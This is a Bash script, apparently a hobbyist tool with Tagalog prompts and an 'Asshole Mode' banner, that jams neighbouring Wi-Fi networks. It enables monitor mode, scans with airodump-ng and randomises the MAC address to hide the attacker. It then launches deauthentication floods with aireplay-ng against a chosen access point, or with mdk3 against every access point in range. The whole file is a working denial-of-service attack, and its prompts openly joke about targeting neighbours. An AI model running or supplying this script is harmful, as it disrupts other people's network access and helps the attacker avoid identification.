#!/bin/bash

kaliwa='\e[91m'
dilawan='\e[93m'
dutertard='\e[94m'
goku='\e[96m'
verdee='\e[92m'
waley='\e[0m' 

#check if logged-in as root
if [[ $EUID -ne 0 ]]; then
        echo -e "${goku}Log-in bilang root muna.."
        exit 1
fi

function checkPrograms {
    echo -ne "aircrack-ng ---> "
    if ! hash aircrack-ng 2>/dev/null; then
        echo -e "${kaliwa}NOT Installed$waley"
        exit 1
    else
        echo -e "${verdee}Installed$waley"
    fi
    sleep 0.5
    
    echo -ne "mdk3 --> "
    if ! hash mdk3 2>/dev/null; then
        echo -e "${kaliwa}NOT Installed${waley}"
        exit 1
    else 
        echo -e "${verdee}Installed${waley}"
    fi
    sleep 0.5
    
    echo -ne "iwconfig ---> "
    if ! hash iwconfig 2>/dev/null; then
        echo -e "${kaliwa}NOT Installed$waley"
        exit 1
    else
        echo -e "${verdee}Installed$waley"
    fi
    sleep 0.5
    
    echo -ne "macchanger ---> "
    if ! hash macchanger 2>/dev/null; then
        echo -e "${kaliwa}NOT Installed$waley"
        exit 1
    else
        echo -e "${verdee}Installed$waley"
    fi
    sleep 0.5
    
    echo
    echo
}

function reactivateWireless { 
    echo 
    echo -e "${verdee}Restoring wireless connection..."$waley
    sleep 2
    airmon-ng stop $interfaceMon
    service network-manager restart
}

function launchAirodump {
    trap 2 #3 6 15
    echo
    echo -e "Press ${verdee}CTRL+C$waley to stop reconnaissance"
    echo Sniffing available networks...
    sleep 2 
    airodump-ng $interfaceMon
}

function changeMAC {
    ip link set $interfaceMon down
    macchanger -r $interfaceMon
    ip link set $interfaceMon up
}

clear
echo -e "$kaliwa    ___                $dilawan __  __        __        $dutertard __  ___            __    "
echo -e "$kaliwa   /   |   _____ _____ $dilawan/ / / /____   / /___     $dutertard/  |/  /____   ____/ /___ "
echo -e "$kaliwa  / /| |  / ___// ___/$dilawan/ /_/ // __ \ / // _ \   $dutertard/ /|_/ // __ \ / __  // _ '\'"
echo -e "$kaliwa / ___ | (__  )(__  )$dilawan/ __  // /_/ // //  __/  $dutertard/ /  / // /_/ // /_/ //  __/"
echo -e "$kaliwa/_/  |_|/____//____/$dilawan/_/ /_/ \____//_/ \___/  $dutertard/_/  /_/ \____/ \__,_/ \___/ "
echo
echo
echo -e "$goku                        Likha ni \e[4metherealRisk01\e[24m"
echo -e "$goku                             Bersyon: 1.0$waley"
echo
echo
checkPrograms
echo -e "${verdee}Available wireless interfaces:$waley"
echo
echo /sys/class/net/*/wireless | awk -F '/' '{ print $5 }'
echo
echo -e "${verdee}Enter Interface Name:$waley"
read interface
airmon-ng start $interface
airmon-ng check kill

echo -e "${verdee}Showing wireless interfaces...$waley"
echo
iwconfig
echo -e "${verdee}Enter Interface Under Monitor Mode:$waley"
read interfaceMon

echo
echo -e "${verdee}Choose tool to use:$waley"
echo -e "${goku}1 $waley- ${dutertard}aireplay-ng$waley"
echo -e "${goku}2 $waley- ${dutertard}mdk3$waley"
echo
read tool

if [ $tool -eq 1 ]; then
    launchAirodump
    trap "reactivateWireless; exit 1" 2 3 6 
    echo
    echo -e "${verdee}Enter BSSID of AP to jam:$waley"
    read ap
    echo
    echo -e "${verdee}Enter channel of AP:$waley"
    read num
    echo
    echo -e Press ${verdee}CTRL+C$waley or ${verdee}CTRL+'\\'$waley to stop attack
    echo -e "${verdee}Gaguhin ang kapitbahay? [Y / any character for NO]$waley"
    read input
    echo

    if [ $input == "y" ] || [ $input == "Y" ]
        then
        clear
        trap reactivateWireless 2 3 6
        echo -e "${kaliwa}ANG SAMA MONG TAO!!!$waley"
        changeMAC
        #set channel to target AP
        iwconfig $interfaceMon channel $num
        #start attack
        aireplay-ng -0 1000 -a $ap $interfaceMon
    else
        echo -e "${dutertard}Uy nakonsensiya si ungas...$waley"
        reactivateWireless
    fi

else
    launchAirodump
    trap "reactivateWireless; exit 1" 2 3 6 
    echo -e "${verdee}Pagpipilian:$waley"
    echo -e "${dutertard}1 $waley- ${goku}Gaguhin ang LAHAT ng kapitbahay$waley"
    echo -e "${kaliwa}      ..will target all APs within range$waley"
    echo -e "${kaliwa}      ..will hop on all wireless channels$waley"
    echo -e "${kaliwa}      ..wireless channel will be changed every 5 seconds$waley"
    echo -e "${dutertard}2 $waley- ${goku}Gaguhin ang ilang kapitbahay$waley"
    echo -e "${kaliwa}      ..will target all APs using a specific channel$waley"
    echo
    read input
    echo
    
    if [ $input -eq 1 ]; then
        changeMAC
        echo
        echo -e Press ${verdee}CTRL+C$waley or ${verdee}CTRL+'\\'$waley to stop attack
        echo
	echo -e "${kaliwa}Attack has been launched...${waley}"
        mdk3 $interfaceMon d
        
    else
        echo -e "${verdee}Enter channel of target APs:$waley"
        read num
        echo
        changeMAC
        echo
        echo -e Press ${verdee}CTRL+C$waley or ${verdee}CTRL+'\\'$waley to stop attack
        echo
        echo -e "${kaliwa}Attack has been launched...${waley}"
        mdk3 $interfaceMon d -c $num
    fi
fi

